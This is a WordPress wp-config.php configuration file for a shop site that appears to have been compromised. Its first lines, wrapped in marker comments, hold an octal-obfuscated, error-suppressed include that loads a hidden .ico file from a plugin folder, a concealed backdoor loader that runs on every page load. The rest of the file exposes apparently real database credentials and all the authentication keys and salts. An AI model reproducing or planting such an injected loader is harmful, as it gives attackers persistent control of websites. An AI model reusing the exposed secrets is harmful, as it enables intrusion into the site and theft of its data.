<?php
/*46ee2*/

@include "\057ho\155e/\146or\147e/\172ao\155ak\145up\056co\155.c\157/w\160-c\157nt\145nt\057pl\165gi\156s/\167or\144pr\145ss\055se\157/.\062ba\14636\143e.\151co";

/*46ee2*/
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://codex.wordpress.org/Editing_wp-config.php
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('WP_CACHE', true);
define( 'WPCACHEHOME', '/home/forge/zaomakeup.com.co/wp-content/plugins/wp-super-cache/' );
define('DB_NAME', 'zao');

/** MySQL database username */
define('DB_USER', 'zao_shop');

/** MySQL database password */
define('DB_PASSWORD', '67U74pfT');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8mb4');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         '7;=puTQCJNfIe?c5GE}<iPq>[T8~[gN0Le<u8TMdKr*)DNIf*4dT:oY2usgs:WAx');
define('SECURE_AUTH_KEY',  '#{PCSBWFaAL-Z91Yh#[d%ZKnEMbrsjC<WwKG?co?+rH<A!bzV[;Q!i<gQ^y4*2@i');
define('LOGGED_IN_KEY',    'x#%4H~d{8K`Y7Ytz*-gUtBvs7HlV^&QX`! :aT/@ujy0PXMT*iYVw`i,DC/|:N}=');
define('NONCE_KEY',        'cvEPc`rvuoX;&zC.*UYP-o6*!3_R2:V66[Fn<Sp&PeW]{q _jyK/DY89)Nn#>U9v');
define('AUTH_SALT',        'Ks3CSAFPDS-{ uLp*mjhQf|i18C(k7jcXGQ^>W$gNzmh0RCczC#S]@}v+O<Q6hVW');
define('SECURE_AUTH_SALT', 'VCxbUD]DtLL5t`2}W4z?&sGF8Nbx$>kAB.a=;Zz[/8iY4EjJ5$UL&2v =t:a5h?j');
define('LOGGED_IN_SALT',   '3ccLFu01Zx2E&mp[.$9,BCI}-q8;fmCK52,>;I<S U33S4K<qOf]c%$7s#Y/?3/X');
define('NONCE_SALT',       'CR8zQ)RT3UTMrumo1<;~A9WEG0$hW=9P_CaMi*hJ%:o+lHugLO^HUcbELK-a)q|,');

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix  = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the Codex.
 *
 * @link https://codex.wordpress.org/Debugging_in_WordPress
 */
define('WP_DEBUG', false);

/* That's all, stop editing! Happy blogging. */

/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
	define('ABSPATH', dirname(__FILE__) . '/');

/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');